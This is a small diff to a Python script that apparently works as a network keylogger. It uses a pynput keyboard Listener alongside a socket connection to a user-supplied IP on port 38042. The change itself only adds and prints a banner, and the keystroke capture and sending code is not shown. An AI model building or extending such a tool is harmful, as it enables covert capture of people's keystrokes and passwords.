@@ -4,6 +4,8 @@ import socket
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
 
+from output import BANNER
+
 
 def main(host, port=38042):
     with socket.create_connection((host, port)) as sock:
@@ -20,5 +22,6 @@ def main(host, port=38042):
 
 
 if __name__ == '__main__':
+    print(BANNER)
     host = input('IP Address? :')
     main(host)
